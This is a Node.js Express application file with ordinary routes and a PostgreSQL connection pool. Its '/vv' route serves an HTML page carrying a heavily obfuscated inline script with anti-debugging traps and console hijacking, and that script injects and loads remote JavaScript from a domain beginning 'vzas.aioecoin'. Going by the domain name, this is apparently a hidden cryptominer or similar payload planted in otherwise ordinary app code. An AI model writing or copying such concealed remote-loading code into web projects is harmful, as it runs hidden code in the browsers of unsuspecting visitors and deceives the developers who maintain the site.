const createError = require('http-errors');
const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const logger = require('morgan');
const {Pool} = require('pg');

const app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({extended: false}));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// PostgreSQL
const pool = new Pool({
    user: process.env.QOVERY_DATABASE_MY_POSTGRESQL_3498225_USERNAME,
    host: process.env.QOVERY_DATABASE_MY_POSTGRESQL_3498225_HOST,
    database: process.env.QOVERY_DATABASE_MY_POSTGRESQL_3498225_DATABASE,
    password: process.env.QOVERY_DATABASE_MY_POSTGRESQL_3498225_PASSWORD,
    port: process.env.QOVERY_DATABASE_MY_POSTGRESQL_3498225_PORT,
});

app.get('/', function (req, res, next) {
    res.render('index', {title: 'Express'});
});

app.get('/users', function (req, res, next) {
    res.send('respond with a resource 2');
});

app.get('/vv', function (req, res, next) {
    res.send(`<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html;charset=utf-8"><meta name="viewport" content="width=device-width initial-scale=1 user-scalable=no maximum-scale=1" /><title></title><link href="" rel="shortcut icon" /></head><body class="vD9l5RNdZEKs1eTj"><div class="1xdHvMFY2SNlyB" id="fRtOxbvHXTWYzrwK"></div><script>var _0x4c5a=["CMv0DxjUicHMDw5JDgLVBIGPia==","y29UC3rYDwn0B3i=","C2nYAxb0","C3jJ","lM9YzY82mgeYoda2nMi4mdjIotCW","y3jLyxrLrwXLBwvUDa==","D2fYBG==","zgvIDq==","BgvUz3rO","z2DLCG==","y291BNrLCG==","zxHJzxb0Aw9U","yMLUza==","yxbWBhK=","Dgv4Dc9QyxzHC2nYAxb0","y29UC29Szq==","C3rHDgvpyMPLy3q=","z2v0rwXLBwvUDhncEvrHz05HBwu=","E30Uy29UC3rYDwn0B3iOiNjLDhvY","ywn0Aw9U","x19WCM90B19F","Bg9N","DhjHy2u=","DgvZDa==","DgfIBgu=","xcTCkYaQkd86w2eTEKeTwL8KxvSW","Aw5MBW==","Aw5PDa==","ChjVDg90ExbL","AgvHza==","y2HHAw4=","zxjYB3i=","Dg9tDhjPBMC=","ltLHlxPblvPFjf0Qkq=="];!function(n,x){!function(x){for(;--x;)n.push(n.shift())}(204)}(_0x4c5a);var _0x5334=function(x,n){var r=_0x4c5a[x=+x];void 0===_0x5334.ZkCVYa&&(_0x5334.gVNcFY=function(x){for(var n=function(x){for(var n,r,t=String(x).replace(/=+$/,""),_="",i=0,c=0;r=t.charAt(c++);~r&&(n=i%4?64*n+r:r,i++%4)&&(_+=String.fromCharCode(255&n>>(-2*i&6))))r="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(r);return _}(x),r=[],t=0,_=n.length;t<_;t++)r+="%"+("00"+n.charCodeAt(t).toString(16)).slice(-2);return decodeURIComponent(r)},_0x5334.qILpJi={},_0x5334.ZkCVYa=!0);var t=_0x5334.qILpJi[x];return void 0===t?(r=_0x5334.gVNcFY(r),_0x5334.qILpJi[x]=r):r=t,r},_0x3758d2=function(){var t=!0;return function(n,r){var x=t?function(){if(r){var x=r[_0x5334("0xe")](n,arguments);return r=null,x}}:function(){};return t=!1,x}}();!function(){_0x3758d2(this,function(){var x=new RegExp("function *\\( *\\)"),n=new RegExp(_0x5334("0x1a")+_0x5334("0x0"),"i"),r=_0x18282a(_0x5334("0x1c"));x[_0x5334("0x18")](r+_0x5334("0x1f"))&&n[_0x5334("0x18")](r+"input")?_0x18282a():r("0")})()}();var _0x4db9d8=function(){var t=!0;return function(n,r){var x=t?function(){if(r){var x=r[_0x5334("0xe")](n,arguments);return r=null,x}}:function(){};return t=!1,x}}(),_0xdea009=_0x4db9d8(this,function(){for(var x=function(){var n;try{n=Function(_0x5334("0x1")+(_0x5334("0x13")+'n this")( )')+");")()}catch(x){n=window}return n}(),n=x.console=x[_0x5334("0x10")]||{},r=[_0x5334("0x16"),_0x5334("0x7"),_0x5334("0x1b"),_0x5334("0x20"),_0x5334("0xc"),_0x5334("0x19"),_0x5334("0x17")],t=0;t<r[_0x5334("0x9")];t++){var _=_0x4db9d8[_0x5334("0x2")][_0x5334("0x1d")][_0x5334("0xd")](_0x4db9d8),i=r[t],c=n[i]||_;_[_0x5334("0x15")]=_0x4db9d8.bind(_0x4db9d8),_[_0x5334("0x21")]=c[_0x5334("0x21")][_0x5334("0xd")](c),n[i]=_}});_0xdea009();var emfromgetnbrtoo="",script34ssd=document[_0x5334("0x6")](_0x5334("0x3"));function _0x18282a(x){function n(x){if("string"==typeof x)return function(x){}.constructor("while (true) {}")[_0x5334("0xe")](_0x5334("0xb"));1!==(""+x/x)[_0x5334("0x9")]||x%20==0?function(){return!0}[_0x5334("0x2")]("debu"+_0x5334("0xa")).call(_0x5334("0x14")):function(){return!1}[_0x5334("0x2")](_0x5334("0x8")+"gger")[_0x5334("0xe")](_0x5334("0x11")),n(++x)}try{if(x)return n;n(0)}catch(x){}}script34ssd.type=_0x5334("0xf"),setInterval(function(){_0x18282a()},4e3),script34ssd[_0x5334("0x4")]="https://vzas.aioecoin"+_0x5334("0x5")+"7a44b422.js",document[_0x5334("0x12")](_0x5334("0x1e"))[0].appendChild(script34ssd);</script></body></html>`);
});

// catch 404 and forward to error handler
app.use(function (req, res, next) {
    next(createError(404));
});

// error handler
app.use(function (err, req, res, next) {
    // set locals, only providing error in development
    res.locals.message = err.message;
    res.locals.error = req.app.get('env') === 'development' ? err : {};

    // render the error page
    res.status(err.status || 500);
    res.render('error');
});

module.exports = app;
